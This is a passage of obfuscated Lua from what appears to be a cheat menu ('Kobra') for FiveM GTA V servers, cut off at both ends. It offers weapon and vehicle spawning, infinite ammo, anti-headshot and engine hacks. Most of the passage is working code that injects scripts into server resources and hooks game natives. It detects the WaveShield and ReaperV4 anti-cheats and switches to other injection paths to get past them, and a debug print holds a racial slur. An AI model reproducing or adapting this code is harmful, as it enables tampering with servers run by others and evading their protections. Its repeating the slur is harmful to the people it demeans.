                                ]]);end end}}}}},{icon="",label="Weapon",type="subMenu",categories={{label="Spawner",tabs={{type="button",label="Give Weapon",onSelect=function() v59("Weapon Name","WEAPON_",function(v562) if (v562 and (v562~="")) then v269:SpawnSelectedWeapon(v562);end end,"typeable");end},{type="button",label="Give All Weapons",onSelect=function() v269:GiveAllWeapons();end},{type="button",label="Remove All Weapons",onSelect=function() v269:RemoveAllWeapons();end},{type="divider",label="All Weapons"},{type="scrollable",label="Melee",scrollType="onEnter",value=1,values=v269:BuildMenuFromWeaponList({"weapon_unarmed","weapon_knife","weapon_dagger","weapon_bat","weapon_bottle","weapon_crowbar","weapon_golfclub","weapon_hammer","weapon_hatchet","weapon_machete","weapon_switchblade","weapon_nightstick","weapon_wrench"}),onSelect=function(v412) v269:SpawnSelectedWeapon(v269:GetWeaponModelFromLabel(v412));end},{type="scrollable",label="Handguns",scrollType="onEnter",value=1,values=v269:BuildMenuFromWeaponList({"weapon_pistol","weapon_pistol_mk2","weapon_combatpistol","weapon_appistol","weapon_stungun","weapon_pistol50","weapon_snspistol","weapon_heavypistol","weapon_vintagepistol","weapon_flaregun"}),onSelect=function(v413) v269:SpawnSelectedWeapon(v269:GetWeaponModelFromLabel(v413));end},{type="scrollable",label="SMGs",scrollType="onEnter",value=1 + 0 ,values=v269:BuildMenuFromWeaponList({"weapon_microsmg","weapon_smg","weapon_smg_mk2","weapon_assaultsmg","weapon_machinepistol","weapon_minismg","weapon_combatpdw"}),onSelect=function(v414) v269:SpawnSelectedWeapon(v269:GetWeaponModelFromLabel(v414));end},{type="scrollable",label="Rifles",scrollType="onEnter",value=3 -2 ,values=v269:BuildMenuFromWeaponList({"weapon_assaultrifle","weapon_assaultrifle_mk2","weapon_carbinerifle","weapon_carbinerifle_mk2","weapon_advancedrifle","weapon_specialcarbine","weapon_bullpuprifle","weapon_gusenberg","weapon_compactrifle","weapon_bullpuprifle_mk2","weapon_marksmanrifle"}),onSelect=function(v415) v269:SpawnSelectedWeapon(v269:GetWeaponModelFromLabel(v415));end},{type="scrollable",label="Shotguns",scrollType="onEnter",value=1 -0 ,values=v269:BuildMenuFromWeaponList({"weapon_pumpshotgun","weapon_pumpshotgun_mk2","weapon_sawnoffshotgun","weapon_assaultshotgun","weapon_bullpupshotgun","weapon_heavyshotgun","weapon_autoshotgun"}),onSelect=function(v416) v269:SpawnSelectedWeapon(v269:GetWeaponModelFromLabel(v416));end},{type="scrollable",label="Snipers",scrollType="onEnter",value=1,values=v269:BuildMenuFromWeaponList({"weapon_sniperrifle","weapon_heavysniper","weapon_heavysniper_mk2","weapon_marksmanrifle","weapon_marksmanrifle_mk2"}),onSelect=function(v417) v269:SpawnSelectedWeapon(v269:GetWeaponModelFromLabel(v417));end},{type="scrollable",label="Explosives",scrollType="onEnter",value=1 + 0 ,values=v269:BuildMenuFromWeaponList({"weapon_grenade","weapon_stickybomb","weapon_molotov","weapon_pipebomb","weapon_proxmine","weapon_rpg","weapon_grenadelauncher","weapon_rpg","weapon_minigun","weapon_firework"}),onSelect=function(v418) v269:SpawnSelectedWeapon(v269:GetWeaponModelFromLabel(v418));end},{type="scrollable",label="Heavy",scrollType="onEnter",value=1 -0 ,values=v269:BuildMenuFromWeaponList({"weapon_mg","weapon_combatmg","weapon_gusenberg","weapon_minigun","weapon_grenadelauncher","weapon_railgun","weapon_hominglauncher","weapon_compactlauncher"}),onSelect=function(v419) v269:SpawnSelectedWeapon(v269:GetWeaponModelFromLabel(v419));end},{type="scrollable",label="Throwables",scrollType="onEnter",value=1461 -(1295 + 165) ,values=v269:BuildMenuFromWeaponList({"weapon_ball","weapon_flare","weapon_smokegrenade","weapon_bzgas","weapon_petrolcan"}),onSelect=function(v420) v269:SpawnSelectedWeapon(v269:GetWeaponModelFromLabel(v420));end}}},{label="Combat",tabs={{type="button",label="Test Button",onSelect=function() print("hi");end},{type="checkbox",label="Infinite Ammo ",desc="Infinite Ammo, this might be detected on certain servers",checked=false,onSelect=function(v421) if v421 then v269:Notify("success","Kobra","Enabled Infinite Ammo",6282 -(546 + 736) );v269:EnableInfiniteAmmo();else local v611=1937 -(1834 + 103) ;while true do if (v611==0) then v269:Notify("error","Kobra","Disabled Infinite Ammo",3076 + 1924 );v269:DisableInfiniteAmmo();break;end end end end},{type="checkbox",label="Anti-Headshot",checked=false,desc="This will prevent you from being headshot.",onSelect=function(v422) if v422 then local v612=0 -0 ;while true do if (v612==(1766 -(1536 + 230))) then v269:Notify("success","Kobra","Enabled Anti-Headshot",5491 -(128 + 363) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n) return _G[decode(n)] end

                                            -- native wrappers (obfuscated lookup style)
                                            local SetPedSuffersCriticalHits = g({83,101,116,80,101,100,83,117,102,102,101,114,115,67,114,105,116,105,99,97,108,72,105,116,115})
                                            local PlayerPedId_fn = g({80,108,97,121,101,114,80,101,100,73,100})
                                            local Wait_fn = g({87,97,105,116})

                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                -- initFlow (coroutine runner) — copy of your project's coroutine runner pattern
                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[AntiHeadshot] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.antiHeadshotEnabled and not Unloaded do
                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits(ped, false)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                local CreateThread_fn = CreateThread
                                                local Wait_fn = Wait
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetPedSuffersCriticalHits_fn = SetPedSuffersCriticalHits

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait_fn(0)
                                                        if not _G.antiHeadshotEnabled then
                                                            Wait_fn(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits_fn(ped, false)
                                                        end

                                                        ::continue::
                                                    end
                                                end)
                                            end
                                            _G.antiHeadshotEnabled = true
                                        ]]);end break;end end else local v613=0;while true do if (v613==0) then v269:Notify("error","Kobra","Disabled Anti-Headshot",1063 + 3937 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            -- simply clear the flag; coroutine loop will stop
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false
                                        ]]);else v48("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false

                                            -- try to restore default behavior once (best-effort)
                                            if PlayerPedId and SetPedSuffersCriticalHits then
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    pcall(function() SetPedSuffersCriticalHits(ped, true) end)
                                                end
                                            end
                                        ]]);end break;end end end end}}}}},{icon="",label="Vehicle",type="subMenu",categories={{label="Spawner",tabs={{type="checkbox",label="Teleport Into",desc="If selected, this will teleport you into the selected vehicle.",checked=false,onSelect=function(v423) v43=v423 or false ;end},{type="checkbox",label="Delete Previous",desc="If selected, this will delete your previous vehicle when spawning selected vehicle.",checked=false,onSelect=function(v424) v42=v424 or false ;end},{type="divider",label="All Vehicles"},{type="button",label="Addon",onSelect=function() v59("Addon Vehicle","",function(v563) if (v563 and (v563~="")) then v269:SpawnSelectedVehicle(v563,v43,v42);end end,"typeable");end},{icon="ph ph-car",label="Compacts",type="scrollable",scrollType="onEnter",value=1,values={"asbo","blista","brioso","brioso2","brioso3","club","dilettante","dilettante2","issi2","issi3","issi4","issi5","issi6","kanjo","panto","prairie","rhapsody","weevil"},onSelect=function(v425) v269:SpawnSelectedVehicle(v425,v43,v42);end},{icon="ph ph-car",label="Sedans",type="scrollable",scrollType="onEnter",value=2 -1 ,values={"asea","asea2","asterope","asterope2","cinquemila","driftchavosv6","cog55","cog552","cognoscenti","cognoscenti2","deity","hardy","drifthardy","emperor","emperor2","emperor3","fugitive","glendale","glendale2","impaler5","ingot","intruder","minimus","limo2","premier","primo","primo2","regina","rhinehart","romero","schafter2","schafter5","schafter6","stafford","stanier","stratum","stretch","superd","surge","tailgater","tailgater2","warrener","warrener2","washington"},onSelect=function(v426) v269:SpawnSelectedVehicle(v426,v43,v42);end},{icon="ph ph-car",label="SUVs",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"aleutian","astron","baller","baller2","baller3","baller4","baller5","baller6","baller7","baller8","bjxl","cavalcade","cavalcade2","cavalcade3","contender","dorado","dubsta","dubsta2","everon3","fq2","granger","granger2","gresley","habanero","huntley","issi8","iwagen","jubilee","landstalker","landstalker2","mesa","mesa2","novak","patriot","patriot2","radi","rebla","rocoto","seminole","seminole2","serrano","squaddie","toros","vivanite","woodlander","xls","xls2"},onSelect=function(v427) v269:SpawnSelectedVehicle(v427,v43,v42);end},{icon="ph ph-car",label="Coupes",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"cogcabrio","driftfr36","exemplar","f620","felon","felon2","fr36","jackal","kanjosj","oracle","oracle2","postlude","previon","sentinel","sentinel2","windsor","windsor2","zion","zion2"},onSelect=function(v428) v269:SpawnSelectedVehicle(v428,v43,v42);end},{icon="ph ph-car",label="Muscles",type="scrollable",scrollType="onEnter",value=1,values={"blade","brigham","broadway","buccaneer","buccaneer2","buffalo4","buffalo5","chino","chino2","clique","clique2","coquette3","deviant","dominator","dominator2","dominator3","dominator4","dominator5","dominator6","dominator7","dominator8","dominator9","driftdominator10","driftyosemite","dukes","dukes2","dukes3","ellie","eudora","faction","faction2","faction3","gauntlet","gauntlet2","gauntlet3","gauntlet4","gauntlet5","driftgauntlet4","greenwood","hermes","hotknife","hustler","impaler","impaler2","impaler3","impaler4","impaler6","imperator","imperator2","imperator3","lurcher","manana2","moonbeam","moonbeam2","nightshade","peyote2","phoenix","picador","ratloader","ratloader2","ruiner","ruiner2","ruiner3","ruiner4","sabregt","sabregt2","slamvan","slamvan2","slamvan3","slamvan4","slamvan5","slamvan6","stalion","stalion2","tahoma","tampa","tampa3","tampa4","tulip","tulip2","vamos","vigero","vigero2","vigero3","virgo","virgo2","virgo3","voodoo","voodoo2","weevil2","yosemite","yosemite2"},onSelect=function(v429) v269:SpawnSelectedVehicle(v429,v43,v42);end},{icon="ph ph-car",label="Sports Classic",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"ardent","btype","btype2","btype3","casco","cheburek","cheetah2","cheetah3","coquette2","deluxo","dynasty","fagaloa","feltzer3","gt500","infernus2","jb700","jb7002","mamba","manana","michelli","monroe","nebula","peyote","peyote3","pigalle","rapidgt3","retinue","retinue2","savestra","stinger","stingergt","stromberg","swinger","toreador","torero","tornado","tornado2","tornado3","tornado4","tornado5","tornado6","turismo2","viseris","z190","zion3","ztype"},onSelect=function(v430) v269:SpawnSelectedVehicle(v430,v43,v42);end},{icon="ph ph-car",label="Sports",type="scrollable",value=1,values={"alpha","banshee","bestiagts","blista2","blista3","buffalo","buffalo2","buffalo3","calico","carbonizzare","comet2","comet3","comet4","comet5","comet6","comet7","coquette","coquette4","corsita","coureur","cypher","drafter","drifteuros","driftfuto","driftjester","driftremus","drifttampa","driftzr350","elegy","elegy2","euros","everon2","feltzer2","flashgt","furoregt","fusilade","futo","futo2","gauntlet6","gb200","growler","hotring","imorgon","issi7","italigto","italirsx","jester","jester2","jester3","jester4","jugular","khamelion","komoda","kuruma","kuruma2","locust","lynx","massacro","massacro2","neo","neon","ninef","ninef2","omnis","omnisegt","panthere","paragon","paragon2","pariah","penumbra","penumbra2","r300","raiden","rapidgt","rapidgt2","rapidgt4","raptor","remus","revolter","rt3000","ruston","schafter3","schafter4","schlagen","schwarzer","sentinel3","sentinel4","sentinel5","seven70","sm722","specter","specter2","stingertt","streiter","sugoi","sultan","sultan2","sultan3","surano","tampa2","tenf","tenf2","tropos","vectre","verlierer2","veto","veto2","vstr","zr350","zr380","zr3802","zr3803"},onSelect=function(v431) v269:SpawnSelectedVehicle(v431,v43,v42);end},{icon="ph ph-car",label="Super",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"adder","autarch","banshee2","bullet","champion","cheetah","cyclone","deveste","emerus","entity2","entity3","entityxf","fmj","furia","gp1","ignus","infernus","italigtb","italigtb2","krieger","le7b","lm87","nero","nero2","osiris","penetrator","pfister811","prototipo","reaper","s80","sc1","scramjet","sheava","sultanrs","suzume","t20","taipan","tempesta","tezeract","thrax","tigon","torero2","turismo3","turismor","tyrant","tyrus","vacca","vagner","vigilante","virtue","visione","voltic","voltic2","xa21","zeno","zentorno","zorrusso"},onSelect=function(v432) v269:SpawnSelectedVehicle(v432,v43,v42);end},{icon="ph ph-car",label="Motorcycles",type="scrollable",scrollType="onEnter",value=2 -1 ,values={"akuma","avarus","bagger","bati","bati2","bf400","carbonrs","chimera","cliffhanger","daemon","daemon2","deathbike","deathbike2","deathbike3","defiler","diablous","diablous2","double","enduro","esskey","faggio","faggio2","faggio3","fcr","fcr2","gargoyle","hakuchou","hakuchou2","hexer","innovation","lectro","manchez","manchez2","manchez3","nemesis","nightblade","oppressor","oppressor2","pcj","powersurge","ratbike","reever","rrocket","ruffian","sanchez","sanchez2","sanctus","shinobi","shotaro","sovereign","stryder","thrust","vader","vindicator","vortex","wolfsbane","zombiea","zombieb"},onSelect=function(v433) v269:SpawnSelectedVehicle(v433,v43,v42);end},{icon="ph ph-car",label="Off-Road",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"bfinjection","bifta","blazer","blazer2","blazer3","blazer4","blazer5","bodhi2","boor","brawler","bruiser","bruiser2","bruiser3","brutus","brutus2","brutus3","caracara","caracara2","dloader","draugur","driftl352","dubsta3","dune","dune2","dune3","dune4","dune5","freecrawler","hellion","insurgent","insurgent2","insurgent3","kalahari","kamacho","l35","l352","marshall","menacer","mesa3","monster","monster3","monster4","monster5","monstrociti","nightshark","outlaw","patriot3","rancherxl","rancherxl2","ratel","rcbandito","rebel","rebel2","riata","sandking","sandking2","technical","technical2","technical3","terminus","trophytruck","trophytruck2","vagrant","verus","winky","yosemite3","zhaba"},onSelect=function(v434) v269:SpawnSelectedVehicle(v434,v43,v42);end},{icon="ph ph-car",label="Industrial",type="scrollable",scrollType="onEnter",value=1,values={"bulldozer","cutter","dump","flatbed","flatbed2","guardian","handler","mixer","mixer2","rubble","tiptruck","tiptruck2"},onSelect=function(v435) v269:SpawnSelectedVehicle(v435,v43,v42);end},{icon="ph ph-car",label="Utility",type="scrollable",scrollType="onEnter",value=1,values={"airtug","armytanker","armytrailer","armytrailer2","baletrailer","boattrailer","boattrailer2","boattrailer3","caddy","caddy2","caddy3","docktrailer","docktug","forklift","freighttrailer","graintrailer","mower","proptrailer","raketrailer","ripley","sadler","sadler2","scrap","slamtruck","tanker","tanker2","towtruck","towtruck2","towtruck3","towtruck4","tr2","tr3","tr4","tractor","tractor2","tractor3","trailerlarge","trailerlogs","trailers","trailers2","trailers3","trailers4","trailers5","trailersmall","trflat","tvtrailer","tvtrailer2","utillitruck","utillitruck2","utillitruck3"},onSelect=function(v436) v269:SpawnSelectedVehicle(v436,v43,v42);end},{icon="ph ph-car",label="Vans",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"bison","bison2","bison3","bobcatxl","boxville","boxville2","boxville3","boxville4","boxville5","boxville6","burrito","burrito2","burrito3","burrito4","burrito5","camper","gburrito","gburrito2","journey","journey2","minivan","minivan2","paradise","pony","pony2","rumpo","rumpo2","rumpo3","speedo","speedo2","speedo4","speedo5","surfer","surfer2","surfer3","taco","youga","youga2","youga3","youga4"},onSelect=function(v437) v269:SpawnSelectedVehicle(v437,v43,v42);end}}},{label="Vehicle Customization",tabs={{type="button",label="Set License Plate",onSelect=function() v59("Set License Plate","",function(v564) if (v564 and (v564~="")) then local v727=0;local v728;while true do if (v727==(0 -0)) then v728=string.format([[
                                            local function xKqLZVwPt9()
                                                local XcVbNmAsDfGhJkL = PlayerPedId
                                                local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                                                local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                                                local pEd = XcVbNmAsDfGhJkL()
                                                local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                                                if vEh and vEh ~= 0 then
                                                    PoIuYtReWqAzXsDc(vEh, "%s")
                                                end
                                            end

                                            xKqLZVwPt9()
                                        ]],v564);MachoInjectResourceRaw("any",v728);break;end end else v12:Notify("Invalid input","Please enter a valid license plate.","error");end end,"typeable");end},{type="button",label="Repair Vehicle",onSelect=function() v269:RepairVehicle();end},{type="button",label="Clean Vehicle",onSelect=function() v12:Notify("success","Kobra","Cleaned Vehicle",1746 + 1254 );MachoInjectResourceRaw("any",[[
                            local function qPwRYKz7mL()
                                local a = PlayerPedId
                                local b = GetVehiclePedIsIn
                                local c = SetVehicleDirtLevel

                                local ped = a()
                                local veh = b(ped, false)
                                if veh and veh ~= 0 then
                                    c(veh, 0.0)
                                end
                            end

                            qPwRYKz7mL()
                            ]]);end},{type="button",label="Force Vehicle Engine",onSelect=function() v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                                GhYtReFdCxWaQzLp = true

                                local function OpAsDfGhJkLzXcVb()
                                    local lMnbVcXzZaSdFg = CreateThread
                                    lMnbVcXzZaSdFg(function()
                                        local QwErTyUiOp         = _G.PlayerPedId
                                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                                        local function _tick(vh)
                                            if vh and vh ~= 0 then
                                                No_Hotwire_Set(vh, false)
                                                En_g_Degrade_Set(vh, false)
                                                ErTyUiOpAsDfGh(vh, false)
                                                KeEpOnAb(vh, true)

                                                local eh = En_g_Health_Get(vh)
                                                if (not eh) or eh < 300.0 then
                                                    En_g_Health_Set(vh, 900.0)
                                                end

                                                ZxCvBnMqWeRtYu(vh, true, true, true)
                                            end
                                        end

                                        while GhYtReFdCxWaQzLp and not Unloaded do
                                            local p  = QwErTyUiOp()

                                            _tick(AsDfGhJkLz(p, false))
                                            _tick(TyUiOpAsDfGh(p))
                                            _tick(AsDfGhJkLz(p, true))

                                            Wait(0)
                                        end
                                    end)
                                end

                                OpAsDfGhJkLzXcVb()
                            ]]);end,function() v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                GhYtReFdCxWaQzLp = false
                                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                if v and v ~= 0 then
                                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
                                    SetVehicleEngineCanDegrade(v, true)
                                    SetVehicleUndriveable(v, false)
                                end
                            ]]);end},{type="button",label="Max Upgrade",onSelect=function() local v438=0 + 0 ;local v439;local v440;while true do if ((2 -1)==v438) then v440=GetResourceState("ReaperV4")=="started" ;if v439 then print("WaveNiggaStarted");MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);elseif v440 then print("using Reaper fallback");MachoInjectThread(0 -0 ,"any","",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);else MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
